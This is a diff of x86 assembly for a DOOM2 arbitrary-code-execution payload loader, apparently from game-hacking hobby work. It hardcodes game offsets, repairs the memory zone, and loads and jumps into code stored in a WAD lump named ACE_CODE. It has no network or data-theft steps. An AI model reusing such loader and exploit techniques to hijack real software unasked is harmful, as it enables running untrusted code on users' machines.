@@ -1,9 +1,7 @@
 // kgsws' DOOM2 code execution
-// - this code is running from memory block allocated by cached REJECT lump
-// - this source only contains payload, you still need exploited map
+// - this code overwrote 64k chunk of original game code
+// - this source only contains payload, you still need exploited WAD
 //
-// %eax - address somewhere in code
-// %ebx - address somewhere in data
 
 #define TEXT_START	0x1000
 
@@ -11,205 +9,145 @@
 .globl _start
 
 // Loaders purpose is
-// - free everything it can
-// - allocate memory for the code and copy it
-// - allocate memory for .bss and clear it
+// - repair mainzone
+// - allocate space for ACE_CODE
+// - load ACE_CODE
 // - run the code
 
 _start:
-	// backup everything needed
-	// %ebx was backed up by the exploit
-	push	%ecx
-	push	%edx
-	push	%esi
-	push	%edi
-	push	%ebp
+	call	_main
+_main:
+	// get loader base
+	pop	%esi
+	sub	$(TEXT_START+5),%esi	// ESI will always point to loader base
 
-	// get _start base
-	mov	(%ebx),%esi
-	add	$(-TEXT_START),%esi	// ESI will always point to local base
-	// get DATA base
-	sub	$0x2c114,%ebx
-	push	%ebx
-	// get CODE base
-	sub	$0x2e922,%eax
+	// get code base
+	pop	%edi
+	sub	$0x38CA5,%edi	// EDI will always point to code base
 
-	// relocate CODE references
-	mov	$reloc_code_start,%ebx
-	mov	$((reloc_code_end-reloc_code_start)/4),%edx
-	call	do_reloc
+	// get data base
+	mov	0x38C87(%edi),%ebp
+	sub	$0x23a38,%ebp	// EBP will always point to data base
 
-	// relocate DATA references
-	pop	%eax
-	mov	$reloc_data_start,%ebx
-	mov	$((reloc_data_end-reloc_data_start)/4),%edx
-	call	do_reloc
+	// fix stack pointer
+	pop	%esp
 
-	// fix what map exploit broke
-	mov	fixaddr0(%esi),%ebx
-	mov	$0x0364,%eax
-	mov	%eax,(%ebx)
-	xor	%ax,%ax
-	mov	%eax,4(%ebx)
-	mov	fixaddr1(%esi),%ebx
-	mov	$0x033e,%ax
-	mov	%eax,(%ebx)
-	mov	$0x03e8,%ax
-	mov	%eax,4(%ebx)
+	// write intro text
+	lea	logo_start(%esi),%edx
+	mov	$(logo_end-logo_start),%ecx
+	xor	%bx, %bx
+	mov	$0x40,%ah
+	int	$0x21
 
-	// force title screen
-	mov	gamestate(%esi),%eax
-	movw	$3,(%eax)
-	mov	wipegamestate(%esi),%eax
-	movw	$-1,(%eax)
-	call	*D_StartTitle(%esi)
-	mov	titlepic_str(%esi),%eax
-	mov	pagename(%esi),%ebx
-	mov	%eax,(%ebx)
+	// repair mainzone
+	lea	zone_continue(%esi),%eax
+	push	%eax
+	sub	$12,%esp
+	mov	0x74fe0(%ebp),%edx	// mainzone
+	mov	(%edx),%eax	// size
+	lea	0x395C6(%edi),%ecx
+	jmp	*%ecx	// inside Z_Init
+zone_continue:
 
-	// stop sound (to free the data)
-	call	*S_Start(%esi)
-
-	// free everything not needed
-	mov	$50,%eax	// from PU_LEVEL
-	mov	$999999,%edx	// and everything else
-	call	*Z_FreeTags(%esi)
-
-	// get ACE_CODE lump (stored in map name)
+	// get ACE_CODE lump
 	lea	ace_code(%esi),%eax
-	call	*W_CheckNumForName(%esi)
+	lea	0x38AF0(%edi),%ecx	// W_CheckNumForName
+	call	*%ecx
+	test	%eax,%eax
+	jge	load_code
 
-	// get lumpinfo base
-	push	%eax	// backup lumpnum
+	// error text
+	lea	ace_code_missing(%esi),%edx
+	mov	$(ace_code_missing_e-ace_code_missing),%ecx
+	xor	%bx, %bx
+	mov	$0x40,%ah
+	int	$0x21
+	// exit to DOS
+	mov	$0x4C00,%ax
+	int	$0x21
+
+load_code:
+	// get ACE_CODE lumpinfo
 	lea	0x0(,%eax,4),%edx
 	add	%edx,%eax
-	lea	0x0(,%eax,4),%edi	// EDI will point to ACE_CODE lump info
-	mov	lumpinfo(%esi),%edx
-	add	(%edx),%edi
+	lea	0x0(,%eax,4),%ecx	// ECX will point to ACE_CODE lump info
+	add	0x74fa4(%ebp),%ecx	// lumpinfo
 
-	// patch ACE_CODE lump name so it can't ever be read again
-	movb	$0xCC,(%edi)
-
-	// check lump size
-	mov	16(%edi),%eax	// ->size
-	test	%eax,%eax
-	jnz	do_load
-
-	// it's empty!
-	lea	error_text(%esi),%eax
-	push	%eax
-	call	*I_Error(%esi)
-
-do_load:
-	// read .bss size
-	mov	8(%edi),%eax	// ->handle
-	mov	12(%edi),%edx	// ->position
+	// seek to ACE_CODE in file
+	push	%ecx
+	mov	8(%ecx),%eax	// handle
+	mov	12(%ecx),%edx	// offset
 	xor	%ebx,%ebx	// SEEK_SET
-	call	*lseek(%esi)
-	mov	8(%edi),%eax	// ->handle
-	lea	lumpinfo(%esi),%edx
-	mov	$4,%ebx
-	call	*read(%esi)
+	lea	0x408c0(%edi),%ecx	// seek
+	call	*%ecx
 
-	// allocate memory for payload and its .bss
-	mov	lumpinfo(%esi),%eax // .bss size
-	add	16(%edi),%eax	// + lump size
-	mov	$1,%edx	// PU_STATIC
+	// read 4B from ACE_CODE
+	mov	(%esp),%ecx
+	mov	8(%ecx),%eax	// handle
+	lea	logo_start(%esi),%edx	// reuse this memory
+	mov	$4, %ebx	// sizeof(uint32_t)
+	lea	0x40935(%edi),%ecx	// read
+	call	*%ecx
+
+	// allocate space for ACE_CODE and its .bss
+	mov	(%esp),%ecx
+	mov	16(%ecx),%eax	// ACE_CODE size
+	add	logo_start(%esi),%eax	// + .bss size
+	xor	%edx,%edx
+	inc	%edx	// PU_STATIC
 	xor	%ebx,%ebx // NULL
-	call	*Z_Malloc(%esi)
+	lea	0x39690(%edi),%ecx	// Z_Malloc
+	call	*%ecx	// if this fails, weird stuff happens; I_Error was trashed
+	push	%eax
 
-	// read ACE_CODE lump
-	mov	%eax,%edx
-	pop	%eax	// restore lumpnum
-	push	%edx	// backup code pointer
-	call	*W_ReadLump(%esi)
+	// seek to ACE_CODE in file
+	mov	4(%esp),%ecx
+	mov	8(%ecx),%eax	// handle
+	mov	12(%ecx),%edx	// offset
+	xor	%ebx,%ebx	// SEEK_SET
+	lea	0x408c0(%edi),%ecx	// seek
+	call	*%ecx
 
-	// pass relocation info
-	mov	_code_base(%esi),%ebx
-	mov	_data_base(%esi),%ecx
+	// read entire ACE_CODE
+	mov	(%esp),%edx	// buffer
+	mov	4(%esp),%ecx
+	mov	8(%ecx),%eax	// handle
+	mov	16(%ecx),%ebx	// size
+	lea	0x40935(%edi),%ecx	// read
+	call	*%ecx
+
+	// text
+	lea	ace_code_start(%esi),%edx
+	mov	$(ace_code_end-ace_code_start),%ecx
+	xor	%bx, %bx
+	mov	$0x40,%ah
+	int	$0x21
 
 	// run the code
-	pop	%eax	// restore code pointer
-	add	$4,%eax
+	pop	%eax	// ACE_CODE location
+	pop	%ecx
+	add	$4,%eax	// skip .bss size value
 	jmp	*%eax
 
-// relocate the section
-// %eax - section base
-// %ebx - reloc start
-// %edx - reloc count
-do_reloc: // TODO: rework; there is always one element
-	add	%esi,%ebx
-do_reloc_loop:
-	test	%edx,%edx
-	jz	do_reloc_end
-	dec	%edx
-	add	%eax,(%ebx)
-	add	$4,%ebx
-	jmp	do_reloc_loop
-do_reloc_end:
-	ret
-
-//
-// strings
+logo_start:
+	.ascii "kgsws' loader is taking over ...\r\n"
+	.byte 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x20, 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB
+	.byte 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xDB
+	.byte 0xDB, 0xBB, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0xDB, 0xDB, 0xC9, 0xCD, 0xCD, 0xCD
+	.byte 0xCD, 0xBC, 0x0D, 0x0A, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBA, 0xDB, 0xDB, 0xBA, 0x20
+	.byte 0x20, 0x20, 0x20, 0x20, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xDB, 0xDB, 0xC9, 0xCD
+	.byte 0xCD, 0xDB, 0xDB, 0xBA, 0xDB, 0xDB, 0xBA, 0x20, 0x20, 0x20, 0x20, 0x20, 0xDB, 0xDB, 0xC9, 0xCD
+	.byte 0xCD, 0xBC, 0x0D, 0x0A, 0xDB, 0xDB, 0xBA, 0x20, 0x20, 0xDB, 0xDB, 0xBA, 0xC8, 0xDB, 0xDB, 0xDB
+	.byte 0xDB, 0xDB, 0xDB, 0xBB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xDB, 0xBB, 0x0D, 0x0A, 0xC8, 0xCD
+	.byte 0xBC, 0x20, 0x20, 0xC8, 0xCD, 0xBC, 0x20, 0xC8, 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0xC8, 0xCD
+	.byte 0xCD, 0xCD, 0xCD, 0xCD, 0xCD, 0xBC, 0x0D, 0x0A
+logo_end:
 ace_code:
-	.string "MAP32"
-error_text:
-	.string "-= kgsws' Doom2 ACE loader =-\nYou did not include any code."
-
-//
-// tables
-
-// pointers to the CODE section
-// everything here has to be called indirectly
-reloc_code_start:
-//
-_code_base:
-	.4byte	0
-I_Error:
-	.4byte	0x0001AB10
-D_StartTitle:
-	.4byte	0x0001D810
-Z_Malloc:
-	.4byte	0x00039690
-S_Start:
-	.4byte	0x0003F600
-Z_FreeTags:
-	.4byte	0x00039780
-W_CheckNumForName:
-	.4byte	0x00038AF0
-W_ReadLump:
-	.4byte	0x00038BF0
-lseek:
-	.4byte	0x000408c0
-read:
-	.4byte	0x00040935
-autorun_offs:
-	.4byte	0x0001fbc5
-remove_mobj:
-	.4byte	0x00030ea8
-//
-reloc_code_end:
-
-// pointers to the DATA section
-// everything here has to be addressed indirectly
-reloc_data_start:
-//
-_data_base:
-	.4byte	0
-gamestate:
-	.4byte	0x0002B3F4
-wipegamestate:
-	.4byte	0x00011B40
-pagename:
-	.4byte	0x0002a388
-lumpinfo:
-	.4byte	0x00074FA4
-titlepic_str:
-	.4byte	0x00021430
-fixaddr0:
-	.4byte	0x0001B944
-fixaddr1:
-	.4byte	0x0001D530
-//
-reloc_data_end:
+	.string "ACE_CODE"
+ace_code_missing:
+	.ascii "ERROR! Missing ACE_CODE!\r\n"
+ace_code_missing_e:
+ace_code_start:
+	.ascii "Entering ACE_CODE ...\r\n"
+ace_code_end:
 
